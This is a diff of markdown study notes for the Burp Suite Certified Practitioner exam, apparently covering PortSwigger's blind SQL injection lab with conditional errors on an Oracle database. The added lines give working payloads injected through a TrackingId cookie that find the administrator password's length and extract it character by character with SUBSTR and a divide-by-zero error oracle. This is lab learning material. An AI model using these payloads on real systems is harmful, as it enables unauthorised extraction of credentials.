@@ -132,7 +132,7 @@
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/566cee97-0a17-4b33-a364-54794bec9089)
 
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/b3753af3-f066-44bc-8d7b-eae9b7818010)
-
+    
 ## Blind SQL injection with conditional errors
 - Error-based SQL injection refers to cases where you're using error messages to extract or infer sensitive data from the database, even blind.
   - May be able to exploit using boolean expression, such as the way we exploited with conditional responses [previously](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors)
@@ -147,10 +147,10 @@
   - Inserting a fake table, such as `Z1xYCr6Y4IQXrVOI'||(SELECT '' FROM fake)||'` results in an Internal Server Error.
   - Let's try some test conditions:
     ` Z1xYCr6Y4IQXrVOI'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` results in an error, as 1=1, therefore the expression is evaluated to divide by zero, resulting in an error.
-    - We knew to use THEN TO_CHAR from the [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and knowing it was an Oracle database
     `Z1xYCr6Y4IQXrVOI'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` results in no error, as 1 does not = 2, so the expression is ELSE'd to END FROM dual
+- We can find the length of the password by iterating through >s, finally landing on the length being 20: `TrackingId=7naEi4cPCofptQwj'||(SELECT CASE WHEN LENGTH(password)=20 THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||';`
+- After finding the length, I got stuck on this for a while because I was using SUBSTRING. I should've remembered it was an Oracle database - it's SUBSTR. `TrackingId=7naEi4cPCofptQwj'||(SELECT CASE WHEN SUBSTR(password,2,1)='l' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||';`
+ 
+![image](https://github.com/user-attachments/assets/1ba3de6a-1d2f-40c9-a2d2-c1593d871d9d)
 
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/bf3e8f08-3071-447e-b132-1b2e9a5db829)
-
-    
-
